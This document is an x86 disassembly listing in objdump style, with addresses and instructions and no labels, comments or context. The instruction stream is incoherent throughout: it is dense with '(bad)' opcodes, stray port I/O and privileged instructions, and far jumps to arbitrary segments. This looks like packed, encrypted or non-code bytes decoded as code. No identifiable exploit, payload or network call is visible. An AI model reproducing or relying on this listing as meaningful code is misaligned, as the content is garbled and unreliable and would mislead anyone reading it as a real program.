  42b88a:	add    BYTE PTR [eax],al
  42b88c:	add    ah,dl
  42b88e:	dec    esp
  42b88f:	and    al,BYTE PTR [ecx]
  42b891:	adc    edi,ebp
  42b893:	push   cs
  42b894:	into   
  42b895:	mov    bh,0xc1
  42b897:	add    BYTE PTR [eax],al
  42b899:	imul   ebp,DWORD PTR [esi+0x78f610f3],0x79e60872
  42b8a3:	xor    al,0x83
  42b8a5:	ins    DWORD PTR es:[edi],dx
  42b8a6:	scas   al,BYTE PTR es:[edi]
  42b8a7:	out    0x15,eax
  42b8a9:	and    eax,0x2c002c45
  42b8ae:	out    dx,al
  42b8af:	popa   
  42b8b0:	add    al,0x6b
  42b8b2:	cmc    
  42b8b3:	dec    eax
  42b8b4:	ret    
  42b8b5:	lock dec eax
  42b8b7:	mov    esp,0x40f3b701
  42b8bc:	mov    edi,eax
  42b8be:	leave  
  42b8bf:	fdiv   QWORD PTR [ebp+0x75]
  42b8c2:	retf   0xe818
  42b8c5:	call   0xec68:0xea000eae
  42b8cc:	jmp    0x380b:0x293379
  42b8d3:	sbb    al,0x6a
  42b8d5:	cmp    DWORD PTR [esi+0x72aa2821],ebp
  42b8db:	in     al,dx
  42b8dc:	(bad)  
  42b8dd:	pop    esp
  42b8de:	cmp    eax,0xaa39401a
  42b8e3:	(bad)  
  42b8e4:	(bad)  
  42b8e5:	pop    ds
  42b8e6:	sub    ebp,esp
  42b8e8:	(bad)  
  42b8e9:	cmp    al,0x6d
  42b8eb:	ins    DWORD PTR es:[edi],dx
  42b8ec:	inc    esp
  42b8ed:	sub    DWORD PTR [esi+0x8c01],ebp
  42b8f3:	add    BYTE PTR [eax],al
  42b8f5:	add    BYTE PTR [eax],cl
  42b8f7:	jne    0x42b8e5
  42b8f9:	test   BYTE PTR [ecx-0x56cdefc7],bh
  42b8ff:	adc    BYTE PTR [ebp+0xde4ef89],ch
  42b905:	pop    esi
  42b906:	mov    edx,0x9044dc1
  42b90b:	sub    edx,DWORD PTR [edi+edi*8]
  42b90e:	jl     0x42b976
  42b910:	ins    DWORD PTR es:[edi],dx
  42b911:	inc    esp
  42b912:	jmp    0x90babac4
  42b917:	dec    ebp
  42b918:	sar    bh,1
  42b91a:	ror    ch,cl
  42b91c:	sub    BYTE PTR [ebp-0x6d],dh
  42b91f:	dec    esp
  42b920:	push   eax
  42b921:	mov    edi,0xfb12e561
  42b926:	gs mov bl,0x8d
  42b929:	inc    esp
  42b92a:	nop
  42b92b:	sbb    ch,bh
  42b92d:	ja     0x42b8b1
  42b92f:	fwait
  42b930:	adc    bh,BYTE PTR [edi+0xa9c020d]
  42b936:	loope  0x42b8eb
  42b938:	adc    bh,bl
  42b93a:	mov    ebp,0x90448f71
  42b93f:	xor    ch,bh
  42b941:	jnp    0x42b8e5
  42b943:	cdq    
  42b944:	adc    bh,BYTE PTR [edi-0x69a573a]
  42b94a:	sbb    ecx,esp
  42b94c:	ins    BYTE PTR es:[edi],dx
  42b94d:	sti    
  42b94e:	in     al,0xb3
  42b950:	imul   esi,edx,0xffffffdc
  42b953:	aas    
  42b954:	mov    ds:0x8289c86,al
  42b959:	aad    0x0
  42b95b:	add    BYTE PTR [eax],al
  42b95d:	add    BYTE PTR [eax],al
  42b95f:	inc    edi
  42b960:	stc    
  42b961:	adc    al,BYTE PTR [ebp-0x7900f8ba]
  42b967:	inc    edi
  42b968:	sub    DWORD PTR [edx+0x128158e8],esi
  42b96e:	sti    
  42b96f:	(bad)  
  42b970:	aaa    
  42b971:	dec    edi
  42b972:	push   edx
  42b973:	(bad)  
  42b974:	or     ah,BYTE PTR [edi+0x74]
  42b977:	ins    BYTE PTR es:[edi],dx
  42b978:	cmp    eax,0x49b47c67
  42b97d:	addr16 dec esp
  42b97f:	lods   al,BYTE PTR ds:[esi]
  42b980:	inc    ecx
  42b981:	jmp    DWORD PTR [ebx-0x424defa7]
  42b987:	test   BYTE PTR [ecx-0x61],bl
  42b98a:	push   ecx
  42b98b:	inc    edi
  42b98c:	aam    0x15
  42b98e:	xchg   ecx,ecx
  42b990:	aam    0x22
  42b992:	call   0x4376ca0
  42b997:	fstp   TBYTE PTR [ebx]
  42b999:	(bad)  
  42b99a:	mov    ecx,eax
  42b99c:	mov    esi,0xe0575af1
  42b9a1:	fcomp  QWORD PTR [ecx]
  42b9a3:	pop    esp
  42b9a4:	mov    al,ds:0x6e370435
  42b9a9:	cli    
  42b9aa:	bound  edx,QWORD PTR [edi]
  42b9ac:	jno    0x42b9b2
  42b9ae:	pop    edi
  42b9af:	out    0xe3,eax
  42b9b1:	jo     0x42ba13
  42b9b3:	je     0x42b96b
  42b9b5:	sub    ebx,DWORD PTR [ebx+0xf]
  42b9b8:	dec    ebp
  42b9b9:	popa   
  42b9ba:	cmc    
  42b9bb:	push   ss
  42b9bc:	lahf   
  42b9bd:	clc    
  42b9be:	(bad)  
  42b9bf:	outs   dx,DWORD PTR ds:[esi]
  42b9c0:	or     DWORD PTR [ebx+eax*1+0x0],ebx
  42b9c7:	add    BYTE PTR [ebx+0x2e],bh
  42b9ca:	mov    dh,0x78
  42b9cc:	cdq    
  42b9cd:	cmp    esp,DWORD PTR [esi+eax*1+0x7864e3a3]
  42b9d4:	lods   al,BYTE PTR ds:[esi]
  42b9d5:	sahf   
  42b9d6:	add    eax,DWORD PTR [ebx]
  42b9d8:	test   esi,esp
  42b9da:	jmp    0x42ba1f
  42b9dc:	nop
  42b9dd:	xor    esi,DWORD PTR [edx]
  42b9df:	adc    BYTE PTR [ecx+0x2eca70a7],dl
  42b9e5:	mov    ah,0x8
  42b9e7:	(bad)  
  42b9e8:	(bad)  
  42b9ea:	mov    al,0xc5
  42b9ec:	(bad)  
  42b9ed:	mov    dl,0xe8
  42b9ef:	ret    
  42b9f0:	fimul  WORD PTR [ecx-0x3f67d847]
  42b9f6:	enter  0x562e,0x3c
  42b9fa:	adc    dl,BYTE PTR ds:0xe2ef8c0e
  42ba00:	test   BYTE PTR [eax-0x1140ba4b],bh
  42ba06:	ror    DWORD PTR [ebx],1
  42ba08:	outs   dx,BYTE PTR ds:[esi]
  42ba09:	push   edi
  42ba0a:	test   eax,0xf2745ec3
  42ba0f:	add    ebx,DWORD PTR [ebx-0x7cd9f100]
  42ba15:	add    al,0xd0
  42ba17:	ret    0x4fd4
  42ba1a:	loope  0x42ba56
  42ba1c:	cmp    ah,bl
  42ba1e:	xchg   edi,eax
  42ba1f:	jecxz  0x42ba3f
  42ba21:	inc    edx
  42ba22:	sub    BYTE PTR [ebp+0x78],dl
  42ba25:	sahf   
  42ba26:	pusha  
  42ba27:	or     ebp,DWORD PTR [edi-0x3a]
  42ba2a:	xor    bl,ch
  42ba2c:	add    BYTE PTR [eax],al
  42ba2e:	add    BYTE PTR [eax],al
  42ba30:	add    BYTE PTR [esi+0x5f],bh
  42ba33:	in     al,dx
  42ba34:	xor    eax,0x3deb9e78
  42ba39:	js     0x42b9d9
  42ba3b:	inc    esp
  42ba3c:	scas   al,BYTE PTR es:[edi]
  42ba3d:	js     0x42ba0d
  42ba3f:	add    al,0x29
  42ba41:	mov    edi,es
  42ba43:	shr    ch,cl
  42ba45:	sbb    BYTE PTR [esi],al
  42ba47:	arpl   di,sp
  42ba49:	into   
  42ba4a:	lock daa 
  42ba4c:	scas   al,BYTE PTR es:[edi]
  42ba4d:	stc    
  42ba4e:	dec    esi
  42ba4f:	and    BYTE PTR [ecx-0x54b8170e],ch
  42ba55:	fwait
  42ba56:	mov    dl,0x97
  42ba58:	scas   eax,DWORD PTR es:[edi]
  42ba59:	jbe    0x42ba9f
  42ba5b:	cwde   
  42ba5c:	and    eax,0x3127aea8
  42ba61:	fisubr WORD PTR [edx-0x6135c6d9]
  42ba67:	(bad)  
  42ba68:	out    0x76,eax
  42ba6a:	add    al,0x3f
  42ba6c:	mov    ebx,0xa50249e4
  42ba71:	cdq    
  42ba72:	repnz push cs
  42ba74:	push   0x57
  42ba76:	mov    edx,0x4836e89e
  42ba7b:	push   ds
  42ba7c:	sub    DWORD PTR [ebp-0x4e],edx
  42ba7f:	push   cs
  42ba80:	pop    ds
  42ba81:	mov    BYTE PTR [edx-0x4c6c5a71],bh
  42ba87:	popa   
  42ba88:	fild   QWORD PTR [ecx+0x8]
  42ba8b:	imul   edx,DWORD PTR [bx-0x4e],0x44
  42ba90:	add    BYTE PTR [esi+0x12deaa],cl
  42ba96:	add    BYTE PTR [eax],al
  42ba98:	add    BYTE PTR [eax],al
  42ba9a:	cmp    DWORD PTR [edx-0x1285f752],esi
  42baa0:	push   cs
  42baa1:	test   al,0xe8
  42baa3:	retf   0x8306
  42baa6:	test   dl,dl
  42baa8:	jp     0x42baee
  42baaa:	mov    ecx,0xf6011ab1
  42baaf:	lods   eax,DWORD PTR ds:[esi]
  42bab0:	sbb    al,BYTE PTR [ebx-0x4348518b]
  42bab6:	imul   ebp,DWORD PTR [esi-0x5c5f774],0x9dde560e
  42bac0:	not    BYTE PTR [edx]
  42bac2:	imul   ebp,DWORD PTR [esi-0x15dd3cb8],0xe3020c32
  42bacc:	xor    cl,BYTE PTR [eax]
  42bace:	(bad)  
  42bacf:	aaa    
  42bad0:	pusha  
  42bad1:	and    al,0x71
  42bad3:	xor    al,0x5a
  42bad5:	femms  
  42bad7:	mov    BYTE PTR [ecx-0x59a681b7],bl
  42badd:	inc    ecx
  42bade:	jns    0x42ba91
  42bae0:	mov    ?,WORD PTR [esi+0x75]
  42bae3:	mov    cl,0x48
  42bae5:	jne    0x42bb52
  42bae7:	dec    edx
  42bae8:	(bad)
  42baec:	clc    
  42baed:	push   ecx
  42baee:	or     BYTE PTR [esi],dh
  42baf0:	push   ebx
  42baf1:	or     BYTE PTR [eax-0x1b721913],dh
  42baf7:	dec    eax
  42baf8:	pop    esp
  42baf9:	push   0x2a3991
  42bafe:	add    BYTE PTR [eax],al
  42bb00:	add    BYTE PTR [eax],al
  42bb02:	add    BYTE PTR [ecx+0x66],dl
  42bb05:	verw   WORD PTR [ecx]
  42bb08:	fistp  QWORD PTR ds:0xf44e4c6
  42bb0e:	call   0x51ea9c
  42bb13:	nop
  42bb14:	fcom   st(6)
  42bb16:	adc    ecx,ecx
  42bb18:	cwde   
  42bb19:	sbb    al,BYTE PTR [eax]
  42bb1b:	adc    ebx,DWORD PTR [edi-0x66e4b0ce]
  42bb21:	inc    ebx
  42bb22:	mov    DWORD PTR [edi+esi*2+0x30],ecx
  42bb26:	jg     0x42baf8
  42bb28:	stos   BYTE PTR es:[edi],al
  42bb29:	dec    eax
  42bb2a:	push   ebx
  42bb2b:	or     DWORD PTR [edi+0x36],edi
  42bb2e:	and    BYTE PTR [ebp-0x6fffeec5],cl
  42bb34:	dec    esp
  42bb35:	xchg   edi,eax
  42bb36:	test   eax,0x8d105b91
  42bb3b:	push   ecx
  42bb3c:	push   edi
  42bb3d:	jp     0x42bb53
  42bb3f:	inc    eax
  42bb40:	arpl   WORD PTR [esi+0x3e],si
  42bb43:	nop
  42bb44:	pop    ebx
  42bb45:	inc    eax
  42bb46:	sti    
  42bb47:	test   edi,ebp
  42bb49:	or     BYTE PTR [eax-0x70],al
  42bb4c:	fcom   st(3)
  42bb4e:	or     edx,DWORD PTR ds:0x2183ff1a
  42bb54:	pop    ebx
  42bb55:	adc    BYTE PTR [eax],al
  42bb57:	push   0x77fa793a
  42bb5c:	ret    
  42bb5d:	push   ebx
  42bb5e:	and    al,0x8c
  42bb60:	or     al,dl
  42bb62:	mov    esp,ss
  42bb64:	jne    0x42bb6e
  42bb66:	mov    DWORD PTR [eax],eax
  42bb68:	add    BYTE PTR [eax],al
  42bb6a:	add    BYTE PTR [eax],al
  42bb6c:	aam    0x6d
  42bb6e:	xor    al,0x89
  42bb70:	int3   
  42bb71:	mov    ch,0x1e
  42bb73:	call   0x5303c1
  42bb78:	sbb    eax,DWORD PTR [edx-0x5d26eb87]
  42bb7e:	ds and al,0x98
  42bb81:	shl    dl,0xa
  42bb84:	rcl    BYTE PTR ds:0x9c1f1834,cl
  42bb8a:	or     dh,dl
  42bb8c:	jae    0x42bb18
  42bb8e:	and    ch,ch
  42bb90:	or     DWORD PTR [ebx+0x2da427d1],esi
  42bb96:	push   ecx
  42bb97:	ja     0x42bc16
  42bb99:	aaa    
  42bb9a:	add    eax,DWORD PTR [esi-0x712540ff]
  42bba0:	mov    dh,0xb3
  42bba2:	pop    esi
  42bba3:	inc    edi
  42bba4:	mov    ah,0xaa
  42bba6:	pusha  
  42bba7:	dec    edi
  42bba8:	lods   al,BYTE PTR ds:[esi]
  42bba9:	xchg   edx,eax
  42bbaa:	(bad)  
  42bbab:	pop    ss
  42bbac:	pop    edi
  42bbad:	jno    0x42bba1
  42bbaf:	push   edx
  42bbb0:	inc    eax
  42bbb1:	inc    ebx
  42bbb2:	jmp    0x42bc1b
  42bbb4:	mov    ds:0xd382f5f2,al
  42bbb9:	mov    dh,0x7a
  42bbbb:	les    eax,FWORD PTR [ebx-0x62]
  42bbbe:	jo     0x42bc08
  42bbc0:	ins    BYTE PTR es:[edi],dx
  42bbc1:	stos   BYTE PTR es:[edi],al
  42bbc2:	cmp    al,0x9
  42bbc4:	(bad)  
  42bbc5:	mov    cl,0xf5
  42bbc7:	add    ebx,DWORD PTR [ecx]
  42bbc9:	out    dx,eax
  42bbca:	sbb    DWORD PTR [edi+eiz*2],ebx
  42bbcd:	inc    esp
  42bbce:	sub    dh,dl
  42bbd0:	add    BYTE PTR [eax],al
  42bbd2:	add    BYTE PTR [eax],al
  42bbd4:	add    BYTE PTR [esi+0x66fefeb8],ch
  42bbda:	mov    cl,0xf5
  42bbdc:	add    eax,DWORD PTR [edi+0x17620b48]
  42bbe2:	pop    ebp
  42bbe3:	jae    0x42bbdb
  42bbe5:	add    edx,DWORD PTR [edi+0x32944b62]
  42bbeb:	invd   
  42bbed:	addr16 ss (bad) 
  42bbf1:	loop   0x42bbd5
  42bbf3:	sahf   
  42bbf4:	sub    al,0xdc
  42bbf6:	mov    eax,ds:0xa6744860
  42bbfb:	xor    BYTE PTR ds:0x510b9c2,al
  42bc01:	jge    0x42bc35
  42bc03:	dec    ebx
  42bc04:	pop    ebx
  42bc05:	nop
  42bc06:	mov    edi,0x71114210
  42bc0b:	xor    DWORD PTR ds:0xf20eb290,eax
  42bc11:	inc    ebp
  42bc12:	aad    0xc3
  42bc14:	bound  edx,QWORD PTR [esi]
  42bc16:	(bad)  
  42bc18:	inc    edx
  42bc19:	xchg   ebp,eax
  42bc1a:	mov    dl,0xe
  42bc1c:	ins    BYTE PTR es:[edi],dx
  42bc1d:	pusha  
  42bc1e:	mov    es,WORD PTR [edx]
  42bc20:	fs daa 
  42bc22:	pop    esp
  42bc23:	push   cs
  42bc24:	jmp    0x5a516bc
  42bc29:	out    dx,eax
  42bc2a:	inc    edi
  42bc2b:	xchg   ebx,eax
  42bc2c:	sub    DWORD PTR [ecx-0x48],ebp
  42bc2f:	xchg   edi,eax
  42bc30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc31:	mov    bh,0x9e
  42bc33:	test   dl,0x90
  42bc36:	inc    edi
  42bc37:	in     al,dx
  42bc38:	rol    BYTE PTR [eax],1
  42bc3a:	add    BYTE PTR [eax],al
  42bc3c:	add    BYTE PTR [eax],al
  42bc3e:	sti    
  42bc3f:	inc    edx
  42bc40:	in     al,dx
  42bc41:	jmp    0xfd75a360
  42bc46:	xchg   edx,eax
  42bc47:	cmp    edx,DWORD PTR [ebp+0x41]
  42bc4a:	(bad)  [ecx-0x20b716f2]
  42bc50:	jmp    0x42bc26
  42bc52:	xor    esp,DWORD PTR [eax-0x28f516b2]
  42bc58:	xor    bh,ch
  42bc5a:	bound  esi,QWORD PTR [edx-0x70]
  42bc5d:	lods   eax,DWORD PTR ds:[esi]
  42bc5e:	lahf   
  42bc5f:	jp     0x42bcb3
  42bc61:	lds    edi,FWORD PTR [edi-0x6c1eab8c]
  42bc67:	lods   eax,DWORD PTR ds:[esi]
  42bc68:	push   ecx
  42bc69:	and    eax,0x2e959ea8
  42bc6e:	cwde   
  42bc6f:	cmp    DWORD PTR [ebx-0x3b],edx
  42bc72:	mov    ebx,0xd66074e2
  42bc77:	stos   DWORD PTR es:[edi],eax
  42bc78:	cdq    
  42bc79:	es mov esp,edi
  42bc7c:	ds data16 test al,0xde
  42bc80:	add    al,0xa9
  42bc82:	xchg   ebx,eax
  42bc83:	rcl    edx,0xe5
  42bc86:	adc    bh,BYTE PTR [esi+ecx*1]
  42bc89:	xlat   BYTE PTR ds:[ebx]
  42bc8a:	shl    bl,cl
  42bc8c:	test   BYTE PTR [eax],0x82
  42bc8f:	test   DWORD PTR [esi],0x5c67a200
  42bc95:	mov    esi,DWORD PTR [edx+0x4d]
  42bc98:	outs   dx,BYTE PTR ds:[esi]
  42bc99:	(bad)  
  42bc9a:	inc    ax
  42bc9c:	ins    DWORD PTR es:[edi],dx
  42bc9d:	dec    BYTE PTR ds:0x6938c8
  42bca3:	add    BYTE PTR [eax],al
  42bca5:	add    BYTE PTR [eax],al
  42bca7:	lahf   
  42bca8:	pop    esp
  42bca9:	verw   cx
  42bcac:	retf   
  42bcad:	add    cl,BYTE PTR [ebp-0x72c145d4]
  42bcb3:	jg     0x42bc3e
  42bcb5:	call   0xabf6a3b9
  42bcba:	push   eax
  42bcbb:	out    0xa9,al
  42bcbd:	jb     0x42bcd5
  42bcbf:	sub    DWORD PTR [esi+0x38c5c46b],esi
  42bcc5:	lods   al,BYTE PTR ds:[esi]
  42bcc6:	(bad)  
  42bcc8:	jbe    0x42bd3c
  42bcca:	adc    al,0x31
  42bccc:	jmp    0x750d:0xf2673832
  42bcd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bcd4:	sub    bh,BYTE PTR [esi-0xdb11d75]
  42bcda:	adc    DWORD PTR [ecx-0x72bb694b],ebp
  42bce0:	jp     0x42bc75
  42bce2:	retf   
  42bce3:	and    eax,eax
  42bce5:	jmp    0x5d24:0x502c26ff
  42bcec:	sub    al,0x50
  42bcee:	and    al,0x4d
  42bcf0:	xor    BYTE PTR [eax+0x24],bl
  42bcf3:	inc    ebp
  42bcf4:	dec    ebp
  42bcf5:	lock push es
  42bcf7:	jns    0x42bcae
  42bcf9:	xchg   esp,eax
  42bcfa:	inc    esp
  42bcfb:	dec    ebp
  42bcfc:	cdq    
  42bcfd:	repz add bl,BYTE PTR [ebx]
  42bd00:	jne    0x42bd4b
  42bd02:	pop    esi
  42bd03:	push   esp
  42bd04:	fisubr DWORD PTR [ebx-0x3c]
  42bd07:	cdq    
  42bd08:	je     0x42bd1a
  42bd0a:	add    BYTE PTR [eax],al
  42bd0c:	add    BYTE PTR [eax],al
  42bd0e:	add    BYTE PTR [eax],al
  42bd10:	nop
  42bd11:	int3   
  42bd12:	fimul  WORD PTR [ebx]
  42bd14:	jecxz  0x42bd1c
  42bd16:	inc    edx
  42bd17:	mov    esp,ebx
  42bd19:	scas   eax,DWORD PTR es:[edi]
  42bd1a:	add    ch,BYTE PTR [edi]
  42bd1c:	dec    ebx
  42bd1d:	sub    BYTE PTR [ebp-0x66a48bb5],bl
  42bd23:	pop    ebx
  42bd24:	ins    BYTE PTR es:[edi],dx
  42bd25:	arpl   ax,di
  42bd27:	pop    ecx
  42bd28:	mov    eax,ds:0x887104b
  42bd2d:	(bad)  
  42bd2e:	jmp    0x101f51a7
  42bd33:	out    0x78,eax
  42bd35:	aam    0x5e
  42bd37:	and    al,0x80
  42bd39:	(bad)  
  42bd3a:	fld    QWORD PTR [ebp+esi*8+0x578d72c6]
  42bd41:	pop    eax
  42bd42:	cdq    
  42bd43:	inc    ebx
  42bd44:	lods   al,BYTE PTR ds:[esi]
  42bd45:	pop    ebx
  42bd46:	jbe    0x42bd5c
  42bd48:	iret   
  42bd49:	fidiv  WORD PTR [esi]
  42bd4b:	sbb    BYTE PTR [eax+0x60],ah
  42bd4e:	add    eax,0x128ba664
  42bd53:	jg     0x42bd21
  42bd55:	pop    esi
  42bd56:	xchg   ebp,eax
  42bd57:	mov    edi,0x43975f24
  42bd5c:	ins    BYTE PTR es:[edi],dx
  42bd5d:	pop    ebx
  42bd5e:	push   edx
  42bd5f:	add    eax,0x1049bb
  42bd64:	or     DWORD PTR [edi+0x1ecb1036],edx
  42bd6a:	pop    esi
  42bd6b:	(bad)  
  42bd6c:	jnp    0x42bdc0
  42bd6e:	jns    0x42bd62
  42bd70:	pop    ebx
  42bd71:	dec    ebx
  42bd72:	adc    BYTE PTR [eax],al
  42bd74:	add    BYTE PTR [eax],al
  42bd76:	add    BYTE PTR [eax],al
  42bd78:	add    BYTE PTR [ebx-0x1d0cd8d8],dl
  42bd7e:	push   ebx
  42bd7f:	xchg   edi,eax
  42bd80:	(bad)  
  42bd81:	stc    
  42bd82:	or     edi,eax
  42bd84:	add    BYTE PTR [eax-0x3f3cf0b7],dl
  42bd8a:	fiadd  WORD PTR [ecx-0xa4d6e2a]
  42bd90:	add    ecx,DWORD PTR [edi]
  42bd92:	jno    0x42bdd2
  42bd94:	icebp  
  42bd95:	cmp    eax,DWORD PTR [eax+0x45]
  42bd98:	call   0x877be7d2
  42bd9d:	out    dx,eax
  42bd9e:	(bad)  
  42bd9f:	loope  0x42bd2f
  42bda1:	mov    esp,0x37cc613f
  42bda6:	mov    al,dh
  42bda8:	add    edx,DWORD PTR [eax-0x257801d4]
  42bdae:	dec    edx
  42bdaf:	jne    0x42bda9
  42bdb1:	or     al,BYTE PTR [eax+0x7b]
  42bdb4:	dec    edi
  42bdb5:	mov    ah,0x9a
  42bdb7:	or     eax,0xf5b2922e
  42bdbc:	mov    DWORD PTR [esi],ebp
  42bdbe:	loopne 0x42bd73
  42bdc0:	pop    esi
  42bdc1:	aas    
  42bdc2:	xor    esi,DWORD PTR [edx]
  42bdc4:	nop    DWORD PTR [edx+edx*1]
  42bdc8:	pop    ss
  42bdc9:	inc    edi
  42bdca:	in     eax,0x83
  42bdcc:	mov    bl,BYTE PTR [ebx-0x6a]
  42bdcf:	or     eax,0x7ae7df37
  42bdd4:	dec    eax
  42bdd5:	je     0x42bd7d
  42bdd7:	ins    DWORD PTR es:[edi],dx
  42bdd8:	push   eax
  42bdd9:	ins    BYTE PTR es:[edi],dx
  42bdda:	mov    ds:0x586e,eax
  42bddf:	add    BYTE PTR [eax],al
  42bde1:	add    BYTE PTR [edx+edx*4-0x43],dh
  42bde5:	scas   eax,DWORD PTR es:[edi]
  42bde6:	xchg   edi,eax
  42bde7:	mov    dl,0xf5
  42bde9:	mov    ?,WORD PTR [edi+0xc0bd335]
  42bdef:	sbb    al,0xf6
  42bdf1:	add    edx,DWORD PTR [eax-0x63dfc5d5]
  42bdf7:	sub    ecx,DWORD PTR [ecx-0x22692c73]
  42bdfd:	xor    BYTE PTR [edi],0xaf
  42be00:	jno    0x42bd88
  42be02:	outs   dx,DWORD PTR ds:[esi]
  42be03:	aas    
  42be04:	test   BYTE PTR [esi-0x53e339c],0xe3
  42be0b:	xchg   esi,eax
  42be0c:	push   cs
  42be0d:	leave  
  42be0e:	or     ah,dh
  42be10:	sbb    ebx,DWORD PTR [ecx]
  42be12:	dec    ebx
  42be13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be14:	jb     0x42be15
  42be16:	shl    DWORD PTR [edx+0x3588258f],cl
  42be1c:	iret   
  42be1d:	fisttp QWORD PTR [edx+0x4f268df4]
  42be23:	mov    dl,0xe
  42be25:	jmp    0xd5758490
  42be2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be2b:	pop    esi
  42be2c:	clc    
  42be2d:	xchg   ebx,eax
  42be2e:	adc    edi,DWORD PTR [ebx-0x3a6b25ce]
  42be34:	sub    al,0x27
  42be36:	push   ebx
  42be37:	stos   BYTE PTR es:[edi],al
  42be38:	mov    ds,WORD PTR [esi-0x2b9dc075]
  42be3e:	push   es
  42be3f:	mov    ebx,0x447cf532
  42be44:	enter  0xe8,0x0
  42be48:	add    BYTE PTR [eax],al
  42be4a:	add    BYTE PTR [ebx-0x610bf04e],dl
  42be50:	inc    ebp
  42be51:	popa   
  42be52:	rol    DWORD PTR [esi],cl
  42be54:	je     0x42becc
  42be56:	sub    edi,ebp
  42be58:	mov    cl,0xe
  42be5a:	jmp    0x6c8233ed
  42be5f:	and    DWORD PTR [eax+0xe],ebp
  42be62:	jmp    0xc21ff5fa
  42be67:	jge    0x42bea7
  42be69:	in     al,dx
  42be6a:	(bad)  
  42be6b:	adc    eax,0x2fa29367
  42be70:	stos   DWORD PTR es:[edi],eax
  42be71:	pop    ebx
  42be72:	pusha  
  42be73:	pop    ds
  42be74:	xchg   esi,eax
  42be75:	push   es
  42be76:	ret    0x7a9b
  42be79:	dec    ebx
  42be7a:	icebp  
  42be7b:	mul    DWORD PTR [edx+0x358c3e96]
  42be81:	inc    ebx
  42be82:	int    0x9b
  42be84:	xor    eax,0xa2c681da
  42be89:	push   cs
  42be8a:	add    BYTE PTR [ecx+0x30],bh
  42be8d:	les    ecx,FWORD PTR [ebx-0x508b5d4]
  42be93:	fidivr WORD PTR [eax]
  42be95:	fwait
  42be96:	dec    esp
  42be97:	push   ebp
  42be98:	xchg   edx,eax
  42be99:	not    BYTE PTR [edi+0x34]
  42be9c:	mov    dl,0xe
  42be9e:	mov    ch,BYTE PTR [edx-0x28]
  42bea1:	dec    eax
  42bea2:	pop    ebp
  42bea3:	add    dh,BYTE PTR ds:0xe27a14d0
  42bea9:	xchg   ebx,eax
  42beaa:	in     al,dx
  42beab:	or     bh,ah
  42bead:	cdq    
  42beae:	dec    ebp
  42beaf:	add    BYTE PTR [eax],al
  42beb1:	add    BYTE PTR [eax],al
  42beb3:	add    BYTE PTR [ebp+0x49],bl
  42beb6:	out    dx,al
  42beb7:	movaps XMMWORD PTR [edx+0x3e44c091],xmm6
  42bebe:	mov    esp,0x9574c001
  42bec3:	enter  0xffa1,0xe1
  42bec7:	call   FWORD PTR [esi-0xa0394cc]
  42becd:	pushf  
  42bece:	into   
  42becf:	div    DWORD PTR [ecx-0x727c5292]
  42bed5:	mov    ch,0x5b
  42bed7:	push   ebp
  42bed8:	imul   DWORD PTR [esi]
  42beda:	pop    eax
  42bedb:	and    al,0xe5
  42bedd:	loopne 0x42be78
  42bedf:	dec    esp
  42bee0:	xchg   ebp,eax
  42bee1:	mov    ds:0xb1aeb9f6,al
  42bee6:	push   cs
  42bee7:	mov    ebx,ecx
  42bee9:	mov    ebp,0x87b575dd
  42beee:	into   
  42beef:	jmp    0x42bf2d
  42bef1:	das    
  42bef2:	inc    eax
  42bef3:	and    al,0xc5
  42bef5:	loopne 0x42bede
  42bef7:	je     0x42be7e
  42bef9:	mov    ss,WORD PTR [ebx-0x1568ae32]
  42beff:	jmp    FWORD PTR [esi]
  42bf01:	int3   
  42bf02:	adc    bl,BYTE PTR [edi+0x70]
  42bf05:	lds    esi,FWORD PTR [edx]
  42bf07:	adc    al,0x90
  42bf09:	push   esp
  42bf0a:	push   edx
  42bf0b:	jl     0x42bec1
  42bf0d:	inc    edi
  42bf0e:	and    dl,bh
  42bf10:	or     eax,0xd3e5f34
  42bf15:	lea    ebx,[ecx]
  42bf17:	or     eax,DWORD PTR [eax]
  42bf19:	add    BYTE PTR [eax],al
  42bf1b:	add    BYTE PTR [eax],al
  42bf1d:	pop    ds
  42bf1e:	lea    edx,[edi]
  42bf20:	push   ecx
  42bf21:	loopne 0x42bebd
  42bf23:	aas    
  42bf24:	xchg   esp,edx
  42bf26:	scas   eax,DWORD PTR es:[edi]
  42bf27:	and    ah,BYTE PTR [esi-0x70]
  42bf2a:	sbb    DWORD PTR [ecx],edx
  42bf2c:	call   0x530460
  42bf31:	sbb    esi,ebx
  42bf33:	imul   ebp,esp,0xffffff9c
  42bf36:	push   ebp
  42bf37:	fwait
  42bf38:	inc    ebx
  42bf39:	je     0x42bf8e
  42bf3b:	pop    ebp
  42bf3c:	xchg   DWORD PTR [eax+0xfe1fbf3],ecx
  42bf42:	mov    WORD PTR [ecx],fs
  42bf44:	leave  
  42bf45:	push   ecx
  42bf46:	inc    esp
  42bf47:	sahf   
  42bf48:	(bad)  
  42bf49:	adc    al,0x8b
  42bf4b:	adc    eax,0xd3cfd945
  42bf50:	out    0xc3,eax
  42bf52:	and    esp,edi
  42bf54:	cli    
  42bf55:	adc    eax,0x654b1b05
  42bf5a:	mov    bl,BYTE PTR [ecx-0x15941737]
  42bf60:	cli    
  42bf61:	iret   
  42bf62:	rcl    cl,1
  42bf64:	pop    edx
  42bf65:	data16 test BYTE PTR [ecx+0x7f],0xd4
  42bf6a:	dec    esi
  42bf6b:	rol    BYTE PTR [edi],cl
  42bf6d:	nop
  42bf6e:	rcr    BYTE PTR [ebx+0x24],1
  42bf71:	xchg   esp,eax
  42bf72:	js     0x42bfcf
  42bf74:	push   edx
  42bf75:	aas    
  42bf76:	shr    BYTE PTR [ecx+0x10],0xb
  42bf7a:	add    al,0xdf
  42bf7c:	fnstcw WORD PTR [ebx-0x3]
  42bf7f:	xchg   esp,eax
  42bf80:	cmp    eax,0x0
  42bf85:	add    BYTE PTR [esi+0x7986e2a8],ah
  42bf8b:	mov    bl,0x75
  42bf8d:	jns    0x42c00e
  42bf8f:	and    BYTE PTR [eax-0x33],0x8a
  42bf93:	cmp    ah,BYTE PTR es:[eax]
  42bf96:	test   BYTE PTR [edx-0x37],cl
  42bf99:	les    ebp,FWORD PTR [edx+0x3c]
  42bf9c:	sbb    al,0x85
  42bf9e:	addr16 sub eax,0xffffffff
  42bfa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfa3:	jb     0x42bf36
  42bfa5:	jae    0x42bfbc
  42bfa7:	cmp    al,0xe2
